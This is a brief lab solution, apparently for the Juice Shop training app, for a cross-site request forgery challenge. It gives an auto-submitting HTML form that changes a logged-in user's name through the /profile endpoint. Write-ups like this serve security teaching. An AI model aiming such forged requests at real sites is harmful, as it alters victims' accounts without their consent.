# CSRF

## Objective

Change the name of a user by performing Cross-Site Request Forgery from [another origin (http://htmledit.squarefree.com/)](http://htmledit.squarefree.com/). **Make sure it supports HTTP (no TLS) to avoid any conflicts with the *mixed-content policy* in the browser**

## Solution

To perform CSRF attacks and change the name of the user on the `/profile` page, craft a HTML page that issues a `POST` request automatically using JavaScript or `<form>` + `autosubmit`.

```html
<form action="http://[JUICE-SHOP-DOMAIN]/profile" method="POST">
  <input type="text" name="username" id="username" value="newuser"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```
